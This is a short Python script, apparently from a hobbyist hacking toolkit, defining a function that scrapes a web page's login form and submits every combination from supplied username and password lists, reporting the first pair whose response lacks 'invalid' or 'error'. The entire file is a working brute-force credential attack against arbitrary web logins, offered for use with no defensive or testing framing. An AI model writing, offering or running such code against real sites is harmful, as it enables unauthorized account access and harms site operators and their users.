import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

def brute_force_login(url, usernames, passwords):
    print("\n🔑 Starting brute force attack...")
    login_form = requests.get(url)
    soup = BeautifulSoup(login_form.content, "html.parser")
    form = soup.find("form")

    if not form:
        print("❌ No form found on page.")
        return

    action = urljoin(url, form.get("action"))
    method = form.get("method", "post").lower()

    input_names = [i.get("name") for i in form.find_all("input") if i.get("name")]

    if len(input_names) < 2:
        print("❌ Not enough input fields to perform brute force.")
        return

    username_field, password_field = input_names[:2]

    for user in usernames:
        for pw in passwords:
            data = {username_field: user.strip(), password_field: pw.strip()}
            if method == "post":
                res = requests.post(action, data=data)
            else:
                res = requests.get(action, params=data)

            if "invalid" not in res.text.lower() and "error" not in res.text.lower():
                print(f"✅ Success: {user.strip()} / {pw.strip()}")
                return

    print("❌ Brute force failed. No valid credentials found.")


# Credits: euphoric-habromaniac